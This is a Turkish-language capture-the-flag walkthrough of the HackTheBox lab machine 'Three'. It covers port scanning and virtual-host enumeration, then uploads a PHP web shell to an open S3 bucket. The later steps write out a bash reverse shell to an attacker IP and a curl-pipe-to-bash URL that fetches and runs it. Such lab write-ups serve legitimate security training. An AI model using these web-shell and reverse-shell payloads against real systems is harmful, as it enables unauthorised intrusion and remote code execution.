---
glightbox: true
---

# Three

!!! info "Target IP Address"

    10.129.227.248

Hedef makine için Nmap taraması gerçekleştir:

```bash
sudo nmap 10.129.227.248 -p- -Pn -T5 --open
```

```text title="Output" hl_lines="7"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-22 00:28 +03
Nmap scan report for 10.129.227.248
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.73 second
```

Web tarayıcısında [http://10.129.227.248](http://10.129.227.248) adresine gidildiğinde yönlendirilen siteye (`thetoppers.htb`) erişebilmek için aşağıdaki komutu çalıştır:

```bash
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
```

Ardından aşağıdaki komutu çalıştır:

```bash
gobuster vhost --append-domain -u thetoppers.htb -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

```text title="Output" hl_lines="15"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://thetoppers.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb Status: 404 [Size: 21]

...SNIP...
```

!!! info "Amazon S3"

    Gobuster ile elde edilen vHost bilgisini Google üzerinde aratırsak, bundan sonraki adımlarımızın [Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html) ile ilgili olacağını öğrenebiliriz.

Web tarayıcısında S3 kovasına (`s3.thetoppers.htb`) erişebilmek için aşağıdaki komutu çalıştır:

```bash
echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

AWS yapılandırmasını gerçekleştir (sorulduğunda her seçenek için `temp` değerini verebilirsin):

```bash
aws configure
```

```text title="Output"
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

Aşağıdaki one-liner komutunu PHP dosyası olarak kaydet:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Oluşturulan bu dosyayı S3 kovasına (bucket) yükle:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Ardından aşağıdaki reverse shell dosyasını oluştur:

```bash title="shell.sh" linenums="1"
#!/bin/bash
bash -i >&/dev/tcp/10.10.14.253/1337 0>&1
```

Netcat ile 1337 numaralı port üzerinden dinlemeye başla:

```bash
nc -nvlp 1337
```

Reverse shell dosyasının bulunduğu dizinde bir Python HTTP sunucusu başlat:

```bash
python -m http.server 8000
```

Web tarayıcısında aşağıda verilen adrese giderek Netcat üzerinde reverse shell elde et:

```text
https://thetoppers.htb/shell.php?cmd=curl%2010.10.14.253:8000/shell.sh|bash
```

Bu shell üzerinde aşağıdaki komutu çalıştırarak ile bayrağı ele geçir:

```bash
cat /var/www/flag.txt
```
